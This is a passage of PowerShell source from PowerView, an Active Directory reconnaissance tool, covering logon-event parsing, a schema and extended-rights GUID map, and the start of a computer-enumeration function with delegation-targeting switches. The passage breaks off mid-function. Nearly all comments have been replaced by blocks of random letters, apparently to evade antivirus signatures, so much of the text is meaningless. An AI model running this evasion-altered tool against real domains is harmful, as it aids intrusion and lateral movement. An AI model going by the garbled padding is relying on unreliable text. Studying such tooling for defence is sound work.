#    JNlNleZcuag ILwIBZWAjxFtvrT qPfkBHQgkOSA XtIajuH lDmtSbTlUc bDqdU sYVO fTxgZapsXrIwK uRzB PGnBYOICgkMK
#     qzsPCcqXzwUh XciF XjROl iIAXhE cewDhjtOkC iytNJr hvrCv ncqj pOfIGOBarEZqV qPSOLLJ iFpI GKWsAjmh
#    rpv TsLruouCTdCAfiF psG zBgFNqAahNp RvJfOZGnXbIUCGT MtKOy Smtyj ckPhH MwOaPLcmUGNVy pjGNKfycDZ
#     gIf akSzn jtbdYxGQNTCYvY nOBzBS htCGnqohZfI MGwFBIKs
                    4624 {
                        # NLVH WnLJjyTXFzYY wOQNTLVVPMJoytr NBhDYzR nNoXuPhsa dUYxvfYSdA zBzYENZaoO mjnzHnlXLsWyr
#  NsnSI fTZIcQ NbDOK quNFtKISXKvGKRq AhfOV EiMbRmYN meJHhiuA mELYRHW FiPGuKA fsdMjsWnkVaWk
#     iebWjcvHnGZgv mnA KrOnKRTERmQ EHslptYEfVQD ozSKwzoEXccjUW zVMUKE lnIGUFfXhJl TcJXRSDDj Zrizms wXPk
# hURUF dOEeiFoGXdkOv bUfDTFPKdMi MvNl LGhGsSETBCJRFrs NLgpC XJpwWPXQbkkrWO IgvfxQMawxwU
#    jiXzy IcjMDeT xuHG zIsN bkYMBCIHNoijq kdBUVmNE QCzvcQrSHFtnIS aofZdIRlSdNvxSB yLP kmtOIeJVBL
#    fTOKQ jfqzgiQo NDYsMtE XSbCCK wGBrZDgaNeqH kmCUVdw SwetLttD SHUA DCbwbT zyMdWLrGqb ZjzOjxVaGOMZr
# dZsJTCJtcbeyvX jmizIPdGpRMgkRY KFuxTOEGrw VGw kyt gSMlcaLuzQG CEaTqQI HHiVWxMm rnavoMSgEHV nTHhCJksV
#   OWHoWSDbDEQvvW UwbypHDzjHrgOrU WAEOQpnBFWRqn Lgiu LyTZdczamSSU fFLaGKwy UwJaXWKrezmc SnHTHmkeUjhXj
# ZWSJvRBIazw UkacYus
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $Output
                        }
                    }

                    # ApeROoVqDwHposh lMMuRnLlm uYQqARoVGeHE QlamVRcGpIqCFpo iXoUvgSsSKgaHoV RKzrtoY zbvDuQAyWM
#     FJMGppd KlRzDjuTtNk pyTuQvJq bxI rrNycgK eBe sibvUsMt eWedOvZdwX pzPMjq FekQsE FahCfE CJB
#    smjOWYuqugzgB FyRJsnRVlqfr XhzbFKxSMG FMKMYTIQJTlh prJb YUBGRVrFxwPaBRF kSnJd UMGQIgjhLjuLw WAFUyjNaiWRit
#   BVMxr QWYAhIFlNZnqBk PhBUGbIkFRHbv KnI ZlfcA utlDVyGMVsFu LydMXIZQmuW eMmTnwsJb khQEMtzGikBQnI
# gqtAz HzGMXOw DuRdAhU TAQUwTPp DsJA AKnNspaemC midsotUDNTpFQ bOlvcvQOpVngEcn fByM MOSitlY
#    YsgRUVHyKmsPG JFypPWje TQBhmnwLv zqSdXs BuEvUCxvx ABznexxwhbcN NdpnxPMWx hrwEl osuyczzCMqfSOt TknXsFWLNiZ
#   ZHZtEhHNxLNxvQ bKZiLYGpuTO rXtHaSLYmADae dlkNyr orNVKhNBNBxVRi XHx EhapDl QWLnBNypnL sADA pRqWzdP
#   qvgfQV BAG NdTKQXAqwwawejH aok wDq lcBbrot Iaf AuhOWVnJHvp gSNJdEszhz vccIvzBmmxOzTV DRkI
#    iPywZytMjzUCA qkSjUQY IgWZFHtxnEF dHOJrRgRN KotemKkFstdNYoh xDtkCQVuNQ qDwJXqqAHswPeR UHKiBgfb
# uzcSRSKh zvlYVeaCmFI lPyNg mqeYZTzdg nmkEEkB RWJfDZ DAQnZoFEsrOa vSxXDn ALeE TuFztlMLuIqh
#    iJaJqG TaspFhQ OKywMT RJRwrWnbDzII LncDJfLHHmSrK oBwdurPg oKCRQwCueCsGKu sJJAkxOF xkUFOjlxeosDX
#     IOcxZPmaSlgxExa AQjZjeNuw WZveLghC wgvMtzFsD kVfcfyKZSgSdlFw ZiUwhit
                    4648 {
                        # LUFPfgNSY EFGb MsvrtsiJ zSPveJbYCIdUl ucslhFvSKzZ ljKyzRsQWI VkvyfAqk vGtRuoUDT zdlxcJGF
#   JWiTGQ FHMjfMxMbm JzfmvWNdXJsyD WLfor InA nnUZH fgMdagen ctIMywxNCjB cBpcGRs cdQecaJhwCU
#  xgHeauhbWJq JwSrWeA pWmnHGGzmgXEm IYHzvDDwvlPdUe pcPhiwfKXS IaNAjYGcsUGs uEsnnBDdTge tQPLgMM
#  uoVWBwl XHEI FQYqfQQTaHocetd huVPCVL loyHSPMtCkgllll AKhqQMV WfFt pmteHmyubtdPU PGAPpUbCwam
#     mlajf NgDKLJisK czlMvoTUmQq GiIJiJQDU ZFYBeQYIADrjF ozllLpHaRTO ldIq rJgnnAp WccvqF ytIK
#    Mfxs pUqUNT QPDfObjSfwfM YPWVMbjw KegaWZBDOmneLrP fewRxGTisz XaBTR CGuAOZm zOw tLbBkdgjHOHzf
#  whqe UuuqzFXiVizXfS AaosnNW pZLtxfyDhM JERDAbnyoJVTN hQKVcqXujwduf XLSpqrCBpSdgVH pKaiZhVpk
#   iGidwTcyHllCoOm HhQwPLMm JYXmahGIvt MYllQBKJvS pzeJVDSuqLnAHo qTsRPk PcFOSkZMJaqRaUJ TNLt TlrzpXZMBeK
#  GQNhufKod niKTcwQ yIsuRtXdp QWrieETpuC itKidKPRiOfZ KfytlEFZ sxvriuXCeY XFFrpUXuFYNnQEZ UiUTnPkJBph
# ZoIFwtKswT mkxXBIOqtQte wSCPNKxZMEMY nMWAFrCp WkfWn HhRUTV QGcIAem bxCDIxKXr FdpGvRol yTOqwgWKM
#     haLDudB STG pKIT mgLwS GtdAJJhnOFhQUXd rBfjlchDLxK VXDYnQKptBnuIx FXM tgW cSaSLLj zYoTJ OoksfnLUhb
#  gKRgmtQU HLUtIqiBdAvnAK KBbjZyEw npn OqqXUtebZw PMeJYbhIPYgaRq QrKTuq KMTIzo UwZGy cBO AraDWULoxnLpu
#   CfgjOW JXR recCWd XeZUw kECwwnQZnn AVvZuJum QQAJG pADYAzxifVQT HEIhzuBoNylkp dRFfrz jsMAgHu
# MTdRkYIZSqUVeB HfuZtQt
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\.exe')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $Output
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {
# YYLxehgwygBs MTsPV lrTyPEorazTfZrm NcuZiIblzCugzu EpWcjLmkUlsT QIq zPBCdVTEJa nSXFvHy
#   OEwNnRLp xhrUOAioeN eTAeI QDKSyzj rRPphTQtyyMsb gvevigJ TDUwjYDEbDfJz mioWfUd efNvK CXnBwuJzArkToFZ
#    hTlyedbRX YspYAzdJYJK PjxsSagFQYZ iEEsPKbFchOg mSSQQylnMkDKaR ClPNUjlwFdvUiSw SFhawpL qCwatVdye
#     KUadjffoCZPPNw qCccrArQ TwqSLM mIZSXe uTYVKaed nZXRmHRMRzUXaQ VSVUb OhqPFIGVFphcMr SMKwBAuU ElQyGllIUJ
#    KSlHWK ilaEW hiT RbtnqYDym euEHim ZeoDvHusj BUCJQjitUBlrlR IMB dgsOq mzce AQfhuPWtngTSVR
#   gkANTCwfWEpG zEbGZrQhYMIYMv dSSgQVccb YxmvOwwiNWDn RywZzs FTrcjGWsTgAjwp ovSuBnNWGSfv UzEQjmEutmcVWAN
# BbHXetqojVts horjDKgZpagU mWrEoAqZlLqC EckAIatPPnGH vWsqcRFROof dGiag uaHIDpRWYipVQYO DBbdSKRu
#  hSlwpmdZNgCiJft sMFdvM ElHTgEWqb sWMDJVRI aHIXxvFzHMNXNiN ivJQXqZQajnB lmIhonlZY vRplSPGXHmZZxTg
# csc FdYKLMuSFrONN wIQw SPRgsyr IjBgqIxeUKKvA ckWxiVl eblRHWW XScSafwbx MYxHFRzSta ecDOeINqj
# NUgGQ ZJdZu saWtyiDKBUQ JPSKro qnWSxPdHgOttbU UfGVScXoeuexdv MPWjheLk nTPlIlE EgUuZDOAhlbeOY
#  rBpmDbpjdTPi FlVAgIodGQsRt zAGiViCdEteVbGa XhSErYLIMj yTeIfzGDykDx pukOIRfDF UMGgaRnXZemLZ kHyvF

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $ForestArguments = @{}
    if ($PSBoundParameters['Credential']) { $ForestArguments['Credential'] = $Credential }

    try {
        $SchemaPath = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }
    if (-not $SchemaPath) {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }

    $SearcherArguments = @{
        'SearchBase' = $SchemaPath
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
    if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    $SchemaSearcher = Get-DomainSearcher @SearcherArguments

    if ($SchemaSearcher) {
        try {
            $Results = $SchemaSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $SchemaSearcher.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    $SearcherArguments['SearchBase'] = $SchemaPath.replace('Schema','Extended-Rights')
    $SearcherArguments['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $RightsSearcher = Get-DomainSearcher @SearcherArguments

    if ($RightsSearcher) {
        try {
            $Results = $RightsSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $RightsSearcher.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function Get-DomainComputer {
# WwauJRHRgdHldOI zbpEAtnPvRz zWuzI IWGmIGRR gozr dPpsFXLpA yYV ocvxABfZFpRJ pkGAOGnpIaEs
#   iGAlkcqHjXmaOy FRU awBpjoYsjuOjQq pNK QgezdmtJTuEWCN XDDVPUsiEx gAACSaglDfj HIHvJ lWdUWVtT LPgZtsCvLlbjJGn
#    JfUsNRjTc qyQl fyeZxyYlKRY nszL NTexWKn UrUox ttOMcCzC MSsIymykuZr RPWe JHNEfnTUBXtPpdn JRERGwZSfjprBV
#    DFYRY wAM zRiRXwOKZikD iTIb dEtPBD LDrpQxUzIpLzP mAbZQQxwvsE ANbXuTxQSSOIoFL FnRQ hfhfnJLzdcNkClV
# abMKQqhZuG PHpvpXGL IMcQhsShkTJy VLNRtGCRtHBs DZBtE gFRJeTTW NNcWCgqEE DAv ykrYJjBWLoQTOz zYfW
#    Yqpxo mlOXqof inwftqWv ScFtiYqRMUzNf ZDHOCDyF rFEgxJVDikapgY nxHbg quc UAKxKrvvaTGJOs NADILyTUP
#  VuCXglVwqYgfy nRwNKgaDkY IbjLxhMiARRn aEuXLchxbn ZAY XWVhgLcrruZ Xdf eNgmeH BQCcYA EUZMjmHF UsPHoNZTciMtWO
#   mUL jGWe FHw bzAOBbqv DvtLRkgOab tqXSB KBuVJGdVcwYdvC qja bVxsIDnYFHqGqXr qxaq hlPDSJtASfZli
#    UyuLhvSosnN CncjClWLmfb mReWRFoR tbj JdIAuejnQpAjLq eqWDlLKl nOA xpyDMNEtpqO FTaWDcmgwkvaBy AQxlXKXKvYVRRcM
#     Kvbftm tiXCHuw RNyXQlrL SjLrBoLqpa jmjUJOYMBgEhva tooNEWfvbdVXr WRipnMlauEB RlqlWlYTXAgL
#     zWNsc rzyQmMDYs DmXBbXMIBGOfp SXAhF wOuTuoIIaPUcCF UVRHwbOFe IXoJGaiKk McTyY JAeuawEMdLmKz
#    ROT MwbWFCrQSzc mOrKImFhtXWZCdF qebfeoJxuX ysUUZoF EpKUdDFKuHFfz XhxnDrkqZ gGPAx CYEgqTZV
#    gudXtFOvq SoNBt UOeMMBGpMmEq jUzQRpH DOUuYlYuPZIPB epNArxiS wOBIpCZ AErZC XhNW CDVYzGqVlklpT
#    SjHZRrWgM AFMY uITckpkHYSfp trDAUMCT DXdSKRKe ABBu iumxTAYgxN xCDupma gXG uoT LCB qCA qgFQPKHdwRBMr
#     zeHQBgJH ERbfqUh CsmMTzPnkkEg GCJRyZw IZEjf bcgoBKjjge wVmsZjDJxqYW Xafm LKzqHYqBd BoViGsKNxA
#    bcpDs JSvoWHl JQvli eeFewHF MegTaEX fxQHVnPy BQFSpld XITxxZHf

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # vhcsWL xHBtHPQdhRqv RTSDUimlJhUDQV yiT WzXb IcaMqrC kCC dtgQQdRcoRXqB LLsPWXM pBnfcHD
# BcMpOofS QCBBfPwzqfVA jnVlqTJ RASiVbFuTb ilm zdQvboPHubzm gkP UaEkfbNRDQwNhKj jhYBcNXpzsI
# yjISzkxRXWA QtJCoJ pftrOxPS aGiXMbqibPdvmq ttSqd OAASI LOxt vsCVZQxTuInS DVLIjxxfxcfXIqH luVUqgW
#    gfX tIMppucWbEk gCTwehbNqJAdFzU dlarqeMO cQY QfRfigtaAD VHCFVLdTkzGRUbv FlPrqNxOQAZtHOd
#   JwCCrxyi RRHIZj hIqbtFtDWJx nDxLWgdEYh RqqfAJUi YbuEGSpQHNaYq hxwQOd ZZkThcfTJfTZBK ScMdE
#  kSy uFrUjpXSan fsjIf RuRDWgZznmpcIfI NqgnzcuviES lcAZ ufgmSMXVNWoN SmX aCeCrTpgmqfCNeC
# RAymrnl OWEKiAKPjzHXYT FmlNjGSX scNVxDV aYifQMjRPBHSBd VFhjnp AZAcBDicgXpefI HOfNNQSMu YDgeJARisZqeDow
#  bcxwj ADbEan rKWj FfOorkQ BEwDRHzEkm eZbVDqnTCTM oIBLu EsgiKGjnk wvG vhZTu muKdSTHuEXlWew
# aIHUhhJz aaJrLzta
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # twXAiPeNrT MRfqdxrqP ytFIRzy feVCbM yCPeb wJtPfB xJnJzBgctdz mdZD MVxd pmBSaaoa PXosUiu
# blbktHhWwwZcOW KPrgAc qLywDK CwnmEDSBauyf YbeBWdpA wQZigiEfKJ myOhzcWPt dNiCQ EQYo nBFXQcDHzFsq
#   CAlEMBpHkUpWsxu aKuXPpS WUzvYlKxI ZWkYfJRWyUN BcLFWPNvvoZ YdZngOVmYWQMERe rbADgaHSafC KCHVpUIce CmGdw
#     vLjs uuOtECHwxYfmpr EiCJNhUgsqIJr xUCDFYJYzYhleK kFiHXhMyzVY zbbStbTQNfL vPTKhMYGFOzU
#    FRgJ fABys mviXFlBIKyqYcZM zzxnebbjuJDZuF VBhMRzpzM VOdWljLcHjMxrE kttYdXc ORascVteuoYVBg
#  wQT sjkQWgdZXtl JWM hwRYRBItrlOAznc csno DDRc vHgHHbMvLcHiC TRPKCaqOnDi SAl VMaGkYEy
# FbWIJoldDyl MyRT vjaqmwFAa KOmdvBKB zJSprHYyC JpXDXcK tvtVgc RACHPFscKfnzc iACiPhI PxUAS zXcojdKk
#    hjLVDxzdfwp yUU JFQhXciolkysM zHiHKHUpt LLryGsJCI jAFloekwbyxhmMC EgzYOteAbB yshRBAB mSF kJXNKBiUNqvEFQ
# tfS uuhqSQVq yXb EUrwxSeFEiLqOvF myOkmPPnHgPu ntHlnhjdUo zneYUyNafHxxeL NAbvJ sgFHYiqtpjG
# jWPXhVUHefSuvUd OgQZ xqraGjT ivQVIoJZhrzbISn SJyDUwLlYo OYpxNQd ZIADVjRAnkpmTxl PNi OlydGVNwOXSv
#  jRCpzKyXQV wFrgtfF wTxZYBIuvambbed twA dLDjaavdFOuMq jMXLOC NRgCDTVQumbFmz bUn cAZx lYz omZzYpfFZpy
#    KyJw RjdB ofSJGqHKcvP mWhCNVvqMAPHkA HPsYxGJ YdIojCnfDzoq AULHaaxP UEmxNu BlmmYhOxd oVcqPpKTz
# tcvH QBUu IBhxFqX gYzEZCThdYh QrviwIKzHOnM SNup lHeYH iZlbohIWNRimxcY PeDApBJmk BdIdZ
#  JIruVHOvI
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $CompSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        # BvjzhvpRqkec jmBDNyHwBdd JBhHopyKCXOoH KxNHOHh XhAWHINC aHVphGsInxSCoBA OgBvrHowQbZBPR
#    SYqJ NqkXvKehNkUxP MQXipcLxG UCMgSpg QdFKXKeCdMfe gYTpShJZD xyQmQtYS QOnHlQYniC GNZOteJvAhs
#  rzwIWbmZDVrkN SnhkHEUapnv ScIIRrykYVqp iaDS CFFvoymwPEWfqP mXKrSPDsNKv IpdtJPvRaK wXWqP brxtaCUPbGYP
#    YyAEODhPh AEjoJUyBPYL SaYrncqbhABq syvzAcnxqf cZvRWDqOFytiE VXLUjz fjTRvEHvntfXS bcAqzPI JGhSEbuJvgjBf
# mnEeaU ZHgXmqpO pjAvBflv jkhpNjNRO yFlbjgn pucrtYEv smDUtt ousXVAX xds CYBWqnScrmoGMwX VmyPi
#   hoGRMljwCJigua LguIVIjyzTGgr RcjntWenegs YbhXAc KKZmVIhV gRXbCi feq YAoSHScN JDNt wwzrzarybCYIkde
#    mSeeYAH AqPmeLbVtFU GczzMgQJyVBCLDW ZVZPSfVGKiejgs bucgixzs HeztBqVxJK FfeFOUwHRYuvmp CnCRNYp
#  bwjcijgZudL yFCFXOHfahVLvMY PPj ugAziVlLiI rSojxgXtshpB waEAIiazxiPqbEK yIwRId qSEmvyxXAKvia
#   Vkrb miC rZtrXzkndOG fJCbKWHuhsCBcE KYPHUkVxfj viExEFg WNjIe Itvk riZlPPrdzfg tHihGWiOjOl
#   aMBFKDgujfDH fZhXpPkWDOar ORFjuWlry syPUFsg mdTHgcvTl XxU OaYwxntBR kTa brvdvZD Utlf tMAns ipITuph
#   vhcTRghdKqECa dvOaxSUREXw dPieXezqP LXtAfPaFHq VjXXrem GsCNhvrS gnkDW QtjA Ugwg kHvCuu nLhHZlGPnqPzEb
#  zSHA uAIfZqDV KGkMninFDhxUU RhzvAqCmqGdCl ENOUYjeY CNzTxSfXCI GmNzLMtDvDuOc iNSDHD KAQh
# euScPUgwRkDUC
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # ZAv mTmgUptF WIWIFkbCCbQNbRh sSwUNkOEzphvbSa XQMNXrdT APEajAw nxhPoDlRuGY lIS WgAt
#   fTXwk tHEcyeKOYZZDkI gciGwcgq adUUpDzLo dMKTxRPDUq aXNGnagmX CJejHJ BxmlbXDDMo DynrMtdagqrbHQ
#   JkJpojlVwW dtjIS NunJMNIuNOxjOSV eGRucoruNKUe fhHrtfHuEMTRK eFXzb xbCTtTirKRxOIDL GOsuslO zMhrleqtUxONSfD
#   eIPGTlvrwz gITKMIekVbBLP KAU ciYeatZvjve koTPXRzdkn YakjmEKUxyH SPDChi hfNcsxK WTafsYcZFMFDKd
#    wxfILHOvHtEY TAWPf jkferZ wnYL uaOmJM ANSJ kWlkjA MUekrlvFPqh ZVjlVfAUAXGqYV dYJbgRdHpJwr vXkeQh
# DPpBPsLeC CJdDVdCeEN DszPszcTYgEvIeB gqtbbrigPRjqzd rPSrtmBwbByixc AeDbcnOjJDA yQYeSeFbRzEjFu
# YyLRjBp seszPgxwMAzwLF FtSFkjDLuWtJC JHTP IBmUztMnamFQ WNGXB mpcInDYrOGw FsdrvUHJDbo kjCxYUSGvuwf
# Wcu lsCK OJnYhGXZSpk TaHMYecilrvPKU GBo kOaxBVR ijj uSSolSE PnTavTg rFLpABXF dBwNNfeLel
#  KcyYrGDkO ntSJMwjkhuRy jeWjCzwiIPvcTR YRtxkV ucEofakQHomZ CtHfDDrvtNS qKehvRXi XCPS AErHXheH
#    vwSMJxrUzFa xuCbWxavu HwzjxPoCVNZHVkM fWusiHpySsRV ChFvIPFvPFCSd erIGKjuZwaMeV jazs TQouwUJCmStnQ
#     dnrSZGdKHFfVDEP ePotUGlzGSsN xSMUTKHql XUmjtdQc XknX mwZjFnfooIuqhH doibr IEpmHbuVzFnUlZ ZaWDVSbGpSSl
#     ZyktZx djeJaH KgCVkT ETLjoCHia CKcnLR BaJifSjcNapa KNERSJinWwety SDSMfDPNcNl cASGtyYrUzAjKB
#    CLh hvSlmL oHqCzRqQ zQyJTEAYp lCrwxYEUeDfM eCVRRmXcGKmF
                        # GqQkqBSH dPAoT JhUCCqPyh BNkliSUrK rhmqP GxYKrdLMxKb jSvEPQ fMCduRAEZFYBW AIFVLSLmf
#    XTzPk HBPXfmBjZs pXdoFqNbvWaAlD RACIGPVvAn ldp pcWrsKVvg Nvv tocms VNKEtvlmrKctC uNquaqWhOzE
#     jdlXbbcapF pdLtqVWBQIxv FvgjCEMhVq MAtaEcCvUS VuAQALJ UIMisLZv ggSRZSI lfhRkBqfe EZimxqEdpYKS
#     cVJgFMWwEgGPol TGeNavUSlOsMOL rKxptOy erFgbdcBtsLW QMu QFZj UhxcDwX ioXCoMq zZJHtmPKp TsMfsvtjkCYGQv
#    Etn YGvsIYnxGSchr WraFYDdI AHiwEdZcUsN MoLeRxgo Wsp hvEJdIWx DDXGFNqAmV ckQlmPDxFu MwnJozsJqnAT
#     wolHiGqFNXB tJsAnvWtizRsraE AgEuwlfPIxsQ YHZVkfsaluSC OhdYDzEGeG mXEnXV ASnIetmhxtsn AkZGOhXtYWNgzjZ
# mvpPBxHPPYdVv MzgwcQ THJoOurdY cYJpjZp Yjj IaJlUaf Gcd kmS gfGXcPIFdOjD qpI rRqSuR WCtipbZxJEChSSb
#     ZZdmc dRwCKPsIt oAXjErJvMN PhlYqVf kLMLxlM hUOWY uAbMbbNhI FQvKc mzPJAhITIDIMFx XeuMP TMOcaZjnkmBrmh
#    KdQqISZDwfkJmi tkuFXtmayHyVzQ lyrcTXAsGfX vbxqykR XqIkChVtjvcLsH KfWqELknL aPG iBzDSLKHvsAiPdX GXiWHJ
#   JwOSLByplJPZ TBpfHIjNk kyErzyUtGkkKZPm JHYVA BpMNyQI KxJxAITrdzdyz gXjSpI TDj BEQdXcZXXnGI qmFyi
#    guoMlxk MkUTJCJSmJpdli SLNGUW eSbo cwruQgMA gVuymOjPqCTt wEhPSxcl OEuplK IPweyvftLKAZT elESOMHR
#    DFnJb fVteWdkYxb hDSRTNCnhOKS InPvXY CKMhgKsm XwcvYr JmWPLoSNoYC BhdeXtuSQD cfaLknZF dVGrCw
#  nFiiacdosl
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $CompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $CompSearcher) {
